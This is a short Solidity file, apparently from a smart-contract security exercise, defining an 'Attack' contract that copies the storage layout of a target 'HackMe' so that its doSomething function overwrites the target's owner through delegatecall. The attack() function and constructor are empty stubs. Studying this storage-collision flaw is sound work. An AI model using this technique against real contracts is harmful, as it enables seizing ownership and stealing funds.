// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;



contract Attack {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables
    address public lib;
    address public owner;
    uint public someNumber;


    constructor() {
    }

    function attack() public {
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint /* _num */) public {
        owner = msg.sender;
    }
}
